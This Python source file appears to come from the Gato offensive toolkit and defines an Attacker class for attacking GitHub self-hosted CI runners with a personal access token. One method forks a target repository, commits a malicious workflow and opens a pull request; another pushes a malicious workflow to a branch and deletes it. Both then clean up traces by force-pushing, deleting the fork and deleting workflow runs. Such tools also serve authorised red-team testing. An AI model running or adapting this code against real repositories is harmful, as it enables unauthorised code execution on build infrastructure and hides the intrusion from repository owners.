import logging
import time
import random
import string

from colorama import Fore, Style

from gato.github import Api
from gato.git import Git
from gato.attack import CICDAttack
from gato.cli import (
    GREEN_PLUS,
    GREEN_EXCLAIM,
    RED_DASH,
    BRIGHT_DASH,
    bright,
)

logger = logging.getLogger(__name__)
logging.root.setLevel(logging.DEBUG)


class Attacker:
    """Class holding all high level logic for executing attacks on self-hosted
    runners.
    """

    def __init__(
        self,
        pat: str,
        socks_proxy: str = None,
        http_proxy: str = None,
        author_email: str = None,
        author_name: str = None,
        timeout: int = 30
    ):

        self.api = Api(
            pat,
            socks_proxy=socks_proxy,
            http_proxy=http_proxy,
        )

        self.socks_proxy = socks_proxy
        self.http_proxy = http_proxy
        self.user_perms = None
        self.author_email = author_email
        self.author_name = author_name
        self.timeout = timeout

    def __setup_user_info(self):
        if not self.user_perms:
            self.user_perms = self.api.check_user()
            if not self.user_perms:
                logger.error("This token cannot be used for attacks!")
                return False

            if self.author_email is None:
                self.author_email = \
                    f"{self.user_perms['user']}@users.noreply.github.com"

            if self.author_name is None:
                self.author_name = self.user_perms['name']

            print(
                f"{GREEN_PLUS} The authenticated user is:"
                f' {Style.BRIGHT}{self.user_perms["user"]}{Style.RESET_ALL}'
            )
            print(
                f"{GREEN_PLUS} The GitHub Classic PAT has the following"
                " scopes:"
                f' {Fore.YELLOW}{", ".join(self.user_perms["scopes"])}'
                f"{Style.RESET_ALL}!"
            )

        return True

    def fork_pr_attack(self, target_repo: str, target_branch: str,
                       pr_title: str, source_branch: str, payload: str,
                       custom_workflow: str,
                       commit_message: str,
                       yaml_name: str = "sh_cicd_attack",
                       workflow_name: str = "Testing"):
        """Creates a malicious fork pull request against a public repository.

        Args:
            target_repo (str): Target repository, this is the one the pull
            request will be opened against.
            target_branch (str): Branch within the target repository for the
            pull request.
            pr_title (str): Title of the pull request.
            source_branch (str): Source branch in the repository that we
            control.
            payload (str): Shell script that will execute.
            custom_workflow (str): A custom YAML workflow that will be utilized
            instead of a shell payload.
            yaml_name (str, optional): Name of the YAML file that will be saved
            to the source branch. Defaults to
            "sh_cicd_attack".
            workflow_name (str, optional): Name of the workflow, this will
            appear in the actions tab. Defaults to
            "Testing".
        """

        self.__setup_user_info()

        if not self.user_perms:
            return False

        if 'repo' in self.user_perms['scopes'] and \
           'workflow' in self.user_perms['scopes']:

            print(
                f"{GREEN_EXCLAIM} Will be conducting an attack against "
                f"{bright(target_repo)} as the user: "
                f"{bright(self.user_perms['user'])}!"
            )

            res = self.api.get_repo_branch(target_repo, target_branch)
            if res == 0:
                print(f"{RED_DASH} Target branch, {target_branch}, does not "
                      "exist!")
                return False
            elif res == -1:
                print(f"{RED_DASH} Failed to check for target branch!")
                return False

            repo_name = self.api.fork_repository(target_repo)
            if not repo_name:
                print(f"{RED_DASH} Error while forking repository!")
                return False

            for i in range(self.timeout):
                status = self.api.get_repository(repo_name)
                if status:
                    print(
                        f"{GREEN_PLUS} Successfully created fork: {repo_name}!"
                    )
                    break
                else:
                    time.sleep(1)

            if not status:
                print(
                    f"{RED_DASH} Forked repository not found after "
                    f"{self.timeout} seconds!"
                )
                return False

            cloned_repo = Git(
                self.api.pat,
                repo_name,
                proxies=self.api.proxies,
                username=self.author_name,
                email=self.author_email
            )

            status = cloned_repo.perform_clone()
            if not status:
                print(f"{RED_DASH} Error cloning forked repository!")
                return False

            if custom_workflow:
                with open(custom_workflow, 'r') as custom_wf:
                    yaml_contents = custom_wf.read()
            else:
                yaml_contents = CICDAttack.create_malicious_yml(
                    payload, workflow_name=workflow_name
                )

            status = cloned_repo.commit_file(
                yaml_contents.encode(),
                f".github/workflows/{yaml_name}.yml",
                message=commit_message
            )
            if not status:
                print(f"{RED_DASH} Failed to commit the malicious workflow "
                      "locally!")
                return False

            status = cloned_repo.push_repository(source_branch)
            if not status:
                print(f"{RED_DASH} Unable push change!")

            if target_branch is None:
                target_branch = 'main'

            pr_url = self.api.create_fork_pr(
                target_repo,
                self.user_perms['user'],
                source_branch,
                target_branch,
                pr_title
            )

            if pr_url:
                print(
                    f"{GREEN_PLUS} Successfully created a PR! It can be"
                    f" viewed at: {bright(pr_url)}"
                )

                rebase_status = cloned_repo.rewrite_commit()

                if rebase_status:
                    print(f"{GREEN_PLUS} Successfully rebased commit")

                    push_status = cloned_repo.push_repository(
                        source_branch,
                        force=True
                    )

                    if push_status:
                        print(f"{GREEN_PLUS} Pushed commit to close PR!")

            else:
                print(f"{RED_DASH} Failed to create a PR for the fork!")

            success = self.api.delete_repository(repo_name)
            if success:
                print(f"{GREEN_PLUS} Successfully deleted the fork!")
            else:
                print(f"{RED_DASH} Failed to delete the fork!")
        else:
            print(f"{RED_DASH} The user does not have the necessary scopes "
                  "to conduct this attack!")

    def shell_workflow_attack(
            self, target_repo,
            payload: str,
            custom_workflow: str,
            target_branch: str,
            commit_message: str,
            delete_action: bool,
            yaml_name: str = "sh_cicd_attack"):

        self.__setup_user_info()

        if not self.user_perms:
            return False

        if 'repo' in self.user_perms['scopes'] and \
           'workflow' in self.user_perms['scopes']:

            print(
                f"{GREEN_EXCLAIM} Will be conducting an attack against "
                f"{bright(target_repo)} as the user: "
                f"{bright(self.user_perms['user'])}!"
            )

            cloned_repo = Git(
                self.api.pat,
                target_repo,
                proxies=self.api.proxies,
                username=self.author_name,
                email=self.author_email
            )
            cloned_repo.perform_clone()

            # Randomly generate a branch name, since this will run immediately
            # otherwise it will fail at the push.
            if target_branch is None:
                branch = ''.join(random.choices(
                    string.ascii_lowercase, k=10))
            else:
                branch = target_branch

            res = self.api.get_repo_branch(target_repo, branch)
            if res == -1:
                print(f"{RED_DASH} Failed to check for remote branch!")
                return
            elif res == 1:
                print(f"{RED_DASH} Remote branch, {branch}, already exists!")
                return

            if custom_workflow:
                with open(custom_workflow, 'r') as custom_wf:
                    yaml_contents = custom_wf.read()
            else:
                yaml_contents = CICDAttack.create_push_yml(
                    payload, branch
                )

            rev_hash = cloned_repo.commit_file(
                yaml_contents.encode(),
                f".github/workflows/{yaml_name}.yml",
                message=commit_message
            )

            if rev_hash is None:
                print(f"{RED_DASH} Failed to commit the malicious workflow "
                      "locally!")
                return

            status = cloned_repo.push_repository(branch)

            if not status:
                print(f"{RED_DASH} Failed to push the malicious workflow!")
                return

            print(f"{GREEN_EXCLAIM} Succesfully pushed the malicious workflow!")

            ret = cloned_repo.delete_branch(branch)

            if ret:
                print(f"{GREEN_EXCLAIM} Malicious branch deleted.")
            else:
                print(f"{RED_DASH} Failed to delete the branch: {branch}.")

            print(f"    {BRIGHT_DASH} Waiting for the workflow to queue...")

            for i in range(self.timeout):
                workflow_id = self.api.get_recent_workflow(target_repo, rev_hash)
                if workflow_id == -1:
                    print(f"{RED_DASH} Failed to find the created workflow!")
                    return
                elif workflow_id > 0:
                    break
                else:
                    time.sleep(1)
            else:
                print(f"{RED_DASH} Failed to find the created workflow!")
                return

            print(f"    {BRIGHT_DASH} Waiting for the workflow to execute...")

            for i in range(self.timeout):
                status = self.api.get_workflow_status(target_repo, workflow_id)
                if status == -1:
                    print(f"{RED_DASH} The workflow failed!")
                    return
                elif status == 1:
                    print(f"{GREEN_EXCLAIM} The malicious workflow executed"
                          " succesfully!")
                    break
                else:
                    time.sleep(1)
            else:
                print(f"{RED_DASH} Workflow still incomplete but hit timeout!")
                return

            res = self.api.download_workflow_logs(target_repo, workflow_id)
            if not res:
                print(f"{RED_DASH} Failed to download logs!")
            else:
                print(f"{GREEN_EXCLAIM} Workflow logs downloaded to "
                      f"{workflow_id}.zip!")

            if delete_action:
                res = self.api.delete_workflow_run(target_repo, workflow_id)
                if not res:
                    print(f"{RED_DASH} Failed to delete workflow!")
                else:
                    print(f"{GREEN_EXCLAIM} Workflow deleted sucesfully!")
        else:
            print(f"{RED_DASH} The user does not have the necessary scopes "
                  "to conduct this attack!")
